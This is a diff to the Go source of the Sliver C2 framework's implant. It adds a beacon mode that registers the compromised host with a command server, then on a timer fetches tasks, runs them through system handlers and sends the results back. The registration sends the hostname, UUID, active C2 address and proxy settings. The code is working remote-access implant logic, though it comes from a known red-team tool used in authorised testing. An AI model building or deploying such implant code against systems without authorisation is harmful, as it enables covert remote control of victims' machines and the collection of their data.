@@ -53,6 +53,7 @@ import (
 	"github.com/bishopfox/sliver/implant/sliver/version"
 
 	"google.golang.org/protobuf/proto"
+	"google.golang.org/protobuf/reflect/protoreflect"
 
 	// {{if .Config.IsService}}
 	"golang.org/x/sys/windows/svc"
@@ -73,7 +74,7 @@ func (serv *sliverService) Execute(args []string, r <-chan svc.ChangeRequest, ch
 			if connection == nil {
 				break
 			}
-			mainLoop(connection)
+			sessionMainLoop(connection)
 		case c := <-r:
 			switch c.Cmd {
 			case svc.Interrogate:
@@ -149,20 +150,84 @@ func main() {
 	svc.Run("", &sliverService{})
 	// {{else}}
 	for {
+
+		// {{if .Config.IsBeacon}}
+		beacon := transports.StartBeaconLoop()
+		if beacon == nil {
+			break
+		}
+		beaconMainLoop(beacon)
+
+		// {{else}}
 		connection := transports.StartConnectionLoop()
 		if connection == nil {
 			break
 		}
-		mainLoop(connection)
+		sessionMainLoop(connection)
+		// {{end}}
+
 	}
 	// {{end}}
 }
 
-func mainLoop(connection *transports.Connection) {
+func beaconMainLoop(beacon *transports.Beacon) {
+	sysHandlers := handlers.GetSystemHandlers()
+	// sysPivotHandlers := handlers.GetSystemPivotHandlers()
+	// specialHandlers := handlers.GetSpecialHandlers()
+
+	// Register beacon
+	err := beacon.Start()
+	if err != nil {
+		// {{if .Config.Debug}}
+		log.Printf("Error starting beacon: %s", err)
+		// {{end}}
+		return
+	}
+	beacon.Send(Envelope(&sliverpb.BeaconRegister{
+		BeaconInterval: beacon.Interval,
+		Register:       RegisterSliver(),
+	}))
+	beacon.Close()
+
+	// Main Loop
+	for {
+		beacon.Start()
+		envelope, err := beacon.Recv()
+		if err != nil {
+			break
+		}
+		tasks := &sliverpb.BeaconTasks{}
+		err = proto.Unmarshal(envelope.Data, tasks)
+		if err != nil {
+			break
+		}
+
+		for _, task := range tasks.Tasks {
+			if handler, ok := sysHandlers[task.Type]; ok {
+				go handler(task.Data, func(data []byte, err error) {
+					err = beacon.Send(&sliverpb.Envelope{
+						ID:   task.ID,
+						Data: data,
+					})
+					if err != nil {
+						// {{if .Config.Debug}}
+						log.Printf("Task send %s", err)
+						// {{end}}
+						return
+					}
+				})
+			}
+		}
+		beacon.Close()
+		time.Sleep(beacon.Duration())
+	}
+}
+
+func sessionMainLoop(connection *transports.Connection) {
 	// Reconnect active pivots
 	pivots.ReconnectActivePivots(connection)
 
-	connection.Send <- getRegisterSliver() // Send registration information
+	connection.Send <- Envelope(RegisterSliver()) // Send registration information
 
 	pivotHandlers := handlers.GetPivotHandlers()
 	tunHandlers := handlers.GetTunnelHandlers()
@@ -231,7 +296,21 @@ func mainLoop(connection *transports.Connection) {
 	}
 }
 
-func getRegisterSliver() *sliverpb.Envelope {
+func Envelope(message protoreflect.ProtoMessage) *sliverpb.Envelope {
+	data, err := proto.Marshal(message)
+	if err != nil {
+		// {{if .Config.Debug}}
+		log.Printf("Failed to encode register msg %s", err)
+		// {{end}}
+		return nil
+	}
+	return &sliverpb.Envelope{
+		Type: sliverpb.MsgRegister,
+		Data: data,
+	}
+}
+
+func RegisterSliver() *sliverpb.Register {
 	hostname, err := os.Hostname()
 	if err != nil {
 		// {{if .Config.Debug}}
@@ -271,7 +350,7 @@ func getRegisterSliver() *sliverpb.Envelope {
 	log.Printf("Uuid: %s", uuid)
 	// {{end}}
 
-	data, err := proto.Marshal(&sliverpb.Register{
+	return &sliverpb.Register{
 		Name:              consts.SliverName,
 		Hostname:          hostname,
 		Uuid:              uuid,
@@ -286,17 +365,7 @@ func getRegisterSliver() *sliverpb.Envelope {
 		ActiveC2:          transports.GetActiveC2(),
 		ReconnectInterval: uint32(transports.GetReconnectInterval() / time.Second),
 		ProxyURL:          transports.GetProxyURL(),
-		PollInterval:      uint32(transports.GetPollInterval() / time.Second),
+		PollTimeout:       uint32(transports.GetPollTimeout() / time.Second),
 		ConfigID:          "{{ .Config.ID }}",
-	})
-	if err != nil {
-		// {{if .Config.Debug}}
-		log.Printf("Failed to encode register msg %s", err)
-		// {{end}}
-		return nil
-	}
-	return &sliverpb.Envelope{
-		Type: sliverpb.MsgRegister,
-		Data: data,
 	}
 }
